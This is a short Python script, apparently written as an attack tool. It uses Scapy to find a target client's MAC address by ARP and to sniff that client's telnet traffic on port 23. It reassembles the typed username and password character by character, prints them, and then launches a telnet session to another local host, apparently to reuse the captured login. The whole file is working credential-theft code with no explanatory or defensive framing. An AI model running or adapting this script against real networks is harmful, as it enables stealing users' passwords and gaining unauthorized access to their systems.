from scapy.all import *
import os

login = []
password = []
interface = 'eth0'
counter = 0

def get_mac(IP):
    conf.verb = 0
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP), timeout=2, iface=interface, inter=0.1)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")

def get_telnet_credentials(pkt):
	global counter
	global login
	global password

	try: 
		pkt.getlayer(Raw).load

	except:
		return

	payload = str(pkt.getlayer(Raw).load)
	if payload != "b'\\r\\x00'" and counter == 1:
		login.append(payload[2])
		return

	elif payload != "b'\\r\\x00'" and counter == 2:
		password.append(payload[2])
		return

	elif payload == "b'\\xff\\xfd\\x01'":
		counter = 1
		return

	elif payload == "b'\\r\\x00'":
		counter = counter + 1
		if counter == 3:
			use_telnet_credentials(login, password)
		else:
			return
	else:
		return


def use_telnet_credentials(login, password):
	str_login = ""
	str_password = ""
	for i in login:
		str_login = str_login + i
	for j in password:
		str_password = str_password + j
	print("user login: " + str_login + "| user password: " + str_password)
	os.system('telnet 192.168.1.153')
	
				
	
	
client_mac = get_mac('192.168.1.221')
sniff(iface= interface, prn=get_telnet_credentials, filter='dst port 23 and ether src {}'.format(client_mac), store=0, count=0)
